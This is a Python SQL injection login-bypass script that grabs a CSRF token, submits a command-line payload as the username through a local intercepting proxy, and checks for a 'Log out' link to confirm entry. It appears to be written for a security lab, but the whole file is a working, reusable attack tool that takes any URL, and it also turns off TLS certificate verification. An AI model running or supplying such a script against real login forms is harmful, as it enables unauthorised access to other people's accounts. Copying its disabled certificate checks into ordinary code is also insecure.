import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://10.0.2.5:8080', 'https':'http://10.0.2.5:8080'}

def get_csrf_token(s, url):
	r = s.get(url, verify=False, proxies=proxies)
	soup = BeautifulSoup(r.text, 'html.parser')
	csrf = soup.find("input")["value"]
	return csrf

def exploit_sqli(s, url, payload):
	csrf = get_csrf_token(s, url)
	data = {"csrf" : csrf, "username" : payload, "password" : "random password"}
	r = s.post(url, data=data, verify = False, proxies=proxies)
	if "Log out" in r.text: # if Log Out button exist, means Logged in
		return True
	return False

if __name__ == "__main__":
	try:
		url = sys.argv[1].strip()
		payload = sys.argv[2].strip()
	except IndexError:
		print('[-] Usage: %s <url> <payload>' % sys.argv[0])
		print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
		sys.exit(-1)

	s = requests.Session()

	if exploit_sqli(s, url, payload):
		print('[+] SQLi Successful')
	else:
		print('[-] SQLi Unsuccessful')
